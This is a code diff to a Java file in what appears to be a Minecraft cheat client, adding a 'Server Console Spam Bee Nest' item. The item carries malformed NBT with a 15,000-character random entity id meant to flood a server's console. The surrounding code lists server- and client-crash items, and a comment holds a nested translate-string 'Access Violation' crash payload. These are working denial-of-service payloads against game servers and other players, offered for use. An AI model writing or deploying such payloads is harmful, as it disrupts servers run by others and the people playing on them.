@@ -18,7 +18,9 @@
 
 package de.nekosarekawaii.vandalism.feature.creativetab.impl;
 
+import de.florianmichael.rclasses.common.RandomUtils;
 import de.nekosarekawaii.vandalism.feature.creativetab.AbstractCreativeTab;
+import net.minecraft.block.Blocks;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.nbt.*;
@@ -57,6 +59,7 @@ public class CrashItemsCreativeTab extends AbstractCreativeTab {
         items.add(withClientSide(createServerInstantCrashSculk(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Sculk")));
         //items.add(withClientSide(createServerInstantCrashSign(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Instant Crash Sign")));
         //items.add(withClientSide(createClientInstantCrashStone(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Client Instant Crash Stone")));
+        items.add(withClientSide(createServerConsoleSpamBeeNest(), Text.literal(Formatting.YELLOW + Formatting.BOLD.toString() + "Server Console Spam Bee Nest")));
     }
 
     private static ItemStack createClientInstantCrashSkull(final String value) {
@@ -231,5 +234,27 @@ public class CrashItemsCreativeTab extends AbstractCreativeTab {
     Access Violation:
     {"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["",{"translate":"%2$s%2$s%2$s%2$s%2$s","with":["txsla", "txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_txsla_"]}]}]}]}]}]}]}]}
      */
+
+    private static ItemStack createServerConsoleSpamBeeNest() {
+        final ItemStack item = new ItemStack(Blocks.BEE_NEST);
+        final NbtCompound base = new NbtCompound();
+        final NbtCompound blockEntityTag = new NbtCompound();
+        final NbtList bees = new NbtList();
+        final NbtCompound bee = new NbtCompound();
+        final NbtCompound entityData = new NbtCompound();
+        entityData.putString("id", "Funny:" + RandomUtils.randomString(
+                15000,
+                true,
+                true,
+                true,
+                true
+        ));
+        bee.put("EntityData", entityData);
+        bees.add(bee);
+        blockEntityTag.put("Bees", bees);
+        base.put("BlockEntityTag", blockEntityTag);
+        item.setNbt(base);
+        return item;
+    }
 
 }
